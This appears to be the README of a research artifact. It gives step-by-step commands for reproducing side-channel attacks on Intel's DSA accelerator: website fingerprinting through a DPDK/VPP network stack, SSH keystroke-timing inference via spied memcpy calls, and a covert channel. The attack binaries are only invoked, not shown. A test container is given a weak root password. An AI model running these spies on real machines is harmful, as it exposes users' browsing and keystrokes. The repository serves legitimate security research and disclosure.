# Attacking the DSA

For real-world attacks, we opt for these attack scenarios:
- [Spying on DPDK networking stack](#dpdk)
- [Spying on DTO-hooked applications](#dto)
- [Covert channel](#covert-channel)

## DPDK

0. Setup DSA
```bash
cd $(ROOTDIR)/setup
sudo ./set_dsa.sh config/dpdk.conf
```

1. Build the VPP image with DPDK support. Since DPDK is not standalone, we select one of the most active DPDK-based projects, VPP (Vector Packet Processing), to build the image.
```bash
cd $(ROOTDIR)/setup/vpp
docker build --build-arg REPO="2506" -t vpp .
```

2. Setup host network for memif master node
```bash
./startvpp1.sh
```

3. Start the VPP container with DPDK support
```bash
docker run -it --rm --name=vpp2 --privileged --network none --dns 114.114.114.114 \
        -v /sys/bus/dsa/devices:/sys/bus/dsa/devices \
        -v /dev/dsa:/dev/dsa \
        -v /run/vpp/memif.sock:/run/vpp/memif.sock \
        -v ./config:/vpp/config \
        vpp /bin/bash
```
Explanation:
- `--privileged`: Grant to access DSA devices.
- `--network none`: Disable the default network stack to avoid conflicts.
- `--dns *` Explicitly set DNS because we disable the default network stack.
- `-v *` Map DSA devtree and memif socket to the container.

4. Verify that the DSA devices are available in the container.

Ping any websites from the container to ensure that the network is working:
```bash
ping -c 3 google.com
```

In host terminal, run:
```bash
sudo vppctl -s /run/vpp/cli-vpp1.sock show dma
```

If you see any non-zero values in `hw`, for example

```
Config 0 thread 0 dma 0/0 request 6913997          hw 12          cpu 2 
```

it means that the DSA is working and you can proceed to the next step.

5. Collect data from the DSA devices.

```bash
cd $(ROOTDIR)/attack
make build TARGET=monitor
./run_wf.sh
```

It takes approximately 5 hours to get traces of 15 websites. Be patient.

6. Classify the data. After executing the previous step, the data will be stored in `evaluate/wfdata`.

```bash
cd $(ROOTDIR)/evaluate
python3 classify.py
```

View the results in terminal for accuracy and the confusion matrix will be saved in `evaluate/confusion_matrix.pdf`.

## DTO
### Setup

Setup DSA

```bash
cd $(ROOTDIR)/setup
sudo ./set_dsa.sh config/common.conf
```

Fetch DTO library and DSA reversing tools

```bash
git submodule update --init --recursive

cd setup/dto
make libdto && cd ../
```

Build the image

```bash
cd ..
docker build -t dto_dsa -f Dockerfile.dto .
```

Start Docker container with

```bash
docker run -it --privileged \
    -v /dev/dsa:/dev/dsa \
    -v /sys/bus/dsa:/sys/bus/dsa \
    -v ./:/root/ \
    --env-file dto.env \ 
    dto_dsa /bin/bash
```

Now you can run any application with DSA acceleration, and most importantly,
you can spy on the `memcpy/memset/memcmp/memmove` made by the application.

Run another container as remote SSH server

```bash
docker run -it --rm --name=ssh_server ubuntu:latest /bin/bash

# inside
apt update && apt install -y ssh
service ssh start
echo "root:123456" | sudo chpasswd
```

Run a the SSH script and open another terminal to monitor the DSA traffic.

```bash
# Container
python sshev.py

# Host
cd $(ROOTDIR)/attack
make spy
sudo taskset -c 50 ./build/atc_spy ssh
# or
sudo taskset -c 50 ./build/swq_spy ssh
```

If you grant `CAP_SYS_RAWIO` to the `atc_spy` binary, you can run it without `sudo`.

Evaluate the results

```bash
cd $(ROOTDIR)/evaluate
mv ground-ts.txt data/atc-ground-ts.txt # or swq-ground-ts.txt
mv ../atc-ssh-ts.txt data/ # or swq-ssh-ts.txt
python3 keystroke.py
```

## Covert channel

Setup DSA

```bash
cd $(ROOTDIR)/setup
sudo ./set_dsa.sh config/common.conf
```

Build the binaries and run the covert channel

```bash
cd $(ROOTDIR)/attack
make covert
./run_cc.sh atc # atc or swq
```

Evaluate the results

```bash
cd $(ROOTDIR)/evaluate
mv ../attack/msg ./ccdata
python3 covert.py
```

This script also plots the results of multiple configurations, but for now we manually record the
data and fill in the script with the results. Uncomment the `draw_graph()` line in `covert.py` to plot the results.

To enable multithreading transmission, setup DSA first

```bash
cd $(ROOTDIR)/setup
sudo ./set_dsa.sh config/full.conf
```